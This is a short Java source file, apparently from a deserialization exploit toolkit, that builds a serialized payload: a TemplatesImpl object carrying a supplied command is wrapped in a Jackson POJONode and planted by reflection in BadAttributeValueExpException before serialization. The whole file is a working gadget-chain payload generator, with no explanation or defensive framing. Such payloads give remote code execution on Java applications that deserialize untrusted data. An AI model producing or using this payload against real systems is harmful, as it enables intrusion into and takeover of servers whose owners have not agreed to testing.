package org.gadget;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.util.TemplateUtils;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;

public class Jackson {
    public static byte[] getBytes(String common) throws Exception {
        TemplatesImpl template = TemplateUtils.getTemplate(common);
        POJONode node = new POJONode(template);
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        //反射设置val属性
        Field val1 = val.getClass().getDeclaredField("val");
        val1.setAccessible(true);
        val1.set(val, node);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        new ObjectOutputStream(byteArrayOutputStream).writeObject(val);
        return byteArrayOutputStream.toByteArray();
    }
}
